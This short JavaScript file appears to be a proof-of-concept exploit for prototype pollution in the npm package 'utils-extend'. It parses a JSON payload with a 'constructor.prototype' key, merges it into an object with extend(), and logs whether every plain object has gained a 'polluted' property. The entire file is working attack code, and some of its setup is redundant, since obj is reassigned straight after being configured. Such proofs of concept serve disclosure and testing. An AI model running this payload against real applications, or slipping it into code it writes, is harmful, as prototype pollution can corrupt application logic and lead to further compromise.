var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {extend} = require('utils-extend');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
const pollutionObject = JSON.parse(payload);
extend(obj, pollutionObject);
console.log({}.polluted);